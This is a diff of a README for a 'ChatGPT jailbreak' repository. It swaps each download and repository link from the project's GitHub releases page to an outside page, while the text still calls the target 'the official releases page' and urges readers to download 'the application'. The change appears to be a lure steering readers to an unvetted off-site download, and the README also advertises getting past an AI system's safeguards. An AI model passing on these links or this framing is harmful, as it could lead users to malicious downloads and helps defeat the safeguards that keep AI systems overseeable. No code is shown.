@@ -1,6 +1,6 @@
 # 🤖 chatgpt-jailbreak-2026 - Unlock ChatGPT's Full Potential Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Clas8996/chatgpt-jailbreak-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT_Jailbreak_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://clas8996.github.io)
 
 ---
 
@@ -23,7 +23,7 @@ chatgpt-jailbreak-2026 is a carefully curated collection of the most powerful Ch
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download chatgpt-jailbreak-2026](https://github.com/Clas8996/chatgpt-jailbreak-2026/releases)**
+Visit this link to download the application: **[Download chatgpt-jailbreak-2026](https://clas8996.github.io)**
 
 Once you click the link, you'll land on the official releases page. Look for the newest version (the topmost file) and click the download button next to it. The download will start automatically.
 
@@ -157,8 +157,8 @@ If chatgpt-jailbreak-2026 helped you, consider:
 
 ## 🔗 Quick Links
 
-- **[Download Now](https://github.com/Clas8996/chatgpt-jailbreak-2026/releases)**
-- **[GitHub Repository](https://github.com/Clas8996/chatgpt-jailbreak-2026)**
+- **[Download Now](https://clas8996.github.io)**
+- **[GitHub Repository](https://clas8996.github.io)**
 
 ---
 
